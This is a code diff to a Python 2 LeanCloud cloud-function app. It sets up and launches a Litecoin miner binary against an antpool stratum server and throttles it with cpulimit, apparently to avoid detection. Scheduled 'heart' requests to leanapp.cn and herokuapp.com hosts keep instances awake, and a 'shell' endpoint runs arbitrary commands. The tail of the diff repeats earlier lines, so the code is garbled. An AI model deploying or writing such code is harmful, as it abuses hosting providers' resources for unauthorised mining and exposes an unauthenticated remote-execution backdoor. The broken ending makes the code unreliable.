@@ -7,6 +7,8 @@ from leancloud import LeanEngineError
 
 import requests
 
+import psutil
+
 engine = Engine()
 
 
@@ -16,6 +18,14 @@ str_setup = 'chmod +x cpum'
 str_cmd = 'PATH="$PATH:/home/leanengine/app" && echo $PATH && cpum --url=stratum+tcp://stratum-ltc.antpool.com:443 --user=waylite --algo=scrypt --userpass waylite.1:x'
 #str_cmd = 'PATH="$PATH:/home/leanengine/app" && echo $PATH && ls -l'
 ENGNIE_RESTARTED = True
+
+@engine.define( 'cpuinfo' )
+def cpu_info():
+	print 'cpu_count',psutil.cpu_count()
+	print 'cpu_freq', psutil.cpu_freq()
+	print 'cpu_stats', psutil.cpu_stats()
+	print 'cpu_percent', psutil.cpu_percent()
+	print 'cpu_times', psutil.cpu_times()
 
 @engine.define( 'shell' )
 # 调试 {'cmd':'ls -l' }
@@ -47,6 +57,74 @@ def OutputShell( cmd, **params ):
 			else:
 				print readbuf_errmsg,
 
+	result.wait() # 等待字进程结束( 等待shell命令结束 )
+	print result.returncode
+	##(stdoutMsg,stderrMsg) = result .communicate()#非阻塞时读法.
+	return result.returncode
+
+#上传运行一次
+# 15 5/15 9-23 * * ?
+@engine.define( 'setup' )
+def Setup(**params):
+	print str_setup
+	OutputShell(str_setup)
+	return True
+
+@engine.define( 'install' )
+def cmd_install(**params):
+	OutputShell('apt-get install cpulimit')
+	OutputShell('sudo apt-get install cpulimit')
+	return True
+
+@engine.define( 'ls' )
+def ls_cmd(**params):
+	OutputShell('ls -l')
+	return True
+
+@engine.define( 'sysinfo' )
+def cmd_sysinfo(**params):
+	OutputShell('cat /etc/issue && cat /proc/cpuinfo')
+	return True
+
+@engine.define( 'cpulimit' )
+def cmd_cpulimit(**params):
+	OutputShell('cpulimit -l 40')
+	return True
+
+#半小时运行一次
+# 15 5/15 9-23 * * ?
+@engine.define( 'enginerestart' )
+def EngineRestart(**params):
+	global ENGNIE_RESTARTED
+	if(ENGNIE_RESTARTED):
+		print 'EngineRestart:Once'
+		ENGNIE_RESTARTED = False
+		OutputShell(str_setup)
+		OutputShell(str_cmd)
+	else:
+		print 'Engine Running:Pass'
+	return True
+
+#半小时运行一次
+# 15 5/15 9-23 * * ?
+@engine.define( 'heart' )
+def Heart(**params):
+	print 'Heart',
+	response = requests.get( "http://mlite01.leanapp.cn/heart" )
+	print '..Heart End'
+	return True
+
+#半小时运行一次
+# 15 5/15 9-23 * * ?
+@engine.define( 'herokuapp' )
+def Heart_herokuapp(**params):
+	print 'Heart of herokuapp',
+	response = requests.get( "https://my-m001.herokuapp.com/" )
+	response = requests.get( "https://my-m002.herokuapp.com/" )
+	print '..Heart End'
+	return True
+
+cpu_info()
 	result.wait() # 等待字进程结束( 等待shell命令结束 )
 	print result.returncode
 	##(stdoutMsg,stderrMsg) = result .communicate()#非阻塞时读法.
